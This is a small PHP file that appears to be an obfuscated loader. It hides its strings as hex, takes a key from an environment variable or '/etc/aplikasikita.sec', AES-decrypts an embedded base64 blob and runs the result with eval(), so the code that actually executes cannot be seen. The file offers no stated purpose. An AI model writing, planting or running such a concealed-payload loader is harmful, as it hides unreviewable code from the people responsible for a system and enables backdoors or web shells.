<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wz4G2CeaPBoeWjbeFu8SBw==');

$c=base64_decode(

'o9ZPvnZ3UDyGkI//sKLwbg1wNFEEQRhwAgv6Wfb9MhQjdlK3SahYh2uLPCNKmPqImP1MOJW1swu6' .
'gsSb7oNEmMEwH7eiM1HGzfmAgNPKCZR4k3ueQbw502e6Hf+oEzweH9r08AjT/RK4Jp4OH9REwIQM' .
'lIRE8flxZ4ZIQFDwRpIfdxOc3CzuU78JbO9umeKuTEWV9Q7+Zga2rqVRA2T//MzhJhoNirg2nd3r' .
'Qw67ZhSNMGJsYU6jHIOcZDbslBGAoxVUJU0ygHbZIurQHkXxnT1Oh6IoDaQGXcJRs75zWIHC6B4P' .
'RketDC/mMyhA5Bukf3xdaCToNCxnLDVRoeGv2mpCR+dmLyw/kLCMaGS4OMJdDGfzRlx78i1LCdZp' .
'7nufqD/NZOTJGsYLE5UadGL1LvFe1ZxwVEf4R0SI7FJ6MQZmgHFD/Mx/Dvnw1RSBQqrZzw5QMDlN' .
'Hwdy36yOYekLiwE2/SR6aBUI7N0e2OUA8Dn+U7CyKUYrhcQh+Kicme1Zq972r8qQBPSbdlXSeDQH' .
'GcrnrAwLaub3gt4+HIa+jiEnc5kdUyNpguEgW3Ir0Vy2b0I9eNiZwraXSe/WxYOjF2lI/CY722ed' .
'v+BloxTrbCxHJhYLkMSPwdVnolz+TEPi7fLe2YK+f6XMcJe0XiyDnserVjhCdQYBB1NpLMrcA+QC' .
'iwzMAOot9A4eqiJYtgfycdXtNLKf22PK/qMITD9eOZFSqKcfCk1NsBohlqha92gk5Vgk/ftIyb+g' .
'gQCVyv1hnUBdAzWP0+WV9M4zmTU1ZBaN5WUIL+Ce6LODcYumaXgkEPDbQp6IM3IKvFhakTC/0+Px' .
'zVPnecwJeYzY0GQuME1OpQPsN1Is6M+z2vN02NkpFtStcAAY9DgNrUzmeB7LmY1yoDnz+BGZwp04' .
'+xJma7c6Utq+qBrYN/xDcCJwfCVsypiLqhwk5asZ7iuWn4aNsbSvdvNTCDq0rCn3+3Z6EYeqQP9N' .
'wjhg98Kz4WOs7RxQ3NXwUg9iYcO3wYy2uqeCs09t7V2qRaqeTQk3fr7RpJVYhpPrm6CIXEyu915p' .
'YyeObWgG/sdxBMtZ8l0pOo8MFxu8iXXOURKmiqghJkhP9icoL7azSYwZop72OySelZpj45ZTnFDY' .
'nqXbrr3AWMSBR87tpWsADcWRZtDiYHvRtquRbH/x85yaeMn0RZ2tGc+CJEgDQXilscBptSpZFiex' .
'cI3qzlXIhkJvAT6DDvigFDshJiN4mHbEK/QEScQD+VyRx1IBbVblGnbpIihZw77GKt3hR35UukBZ' .
'vwKkFRdPlsP0hZp385xB0fnMKkdNPQvzFYlp+sTia64ducSyAsVHK6vr5nguS5uizHPo8ZzAEQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

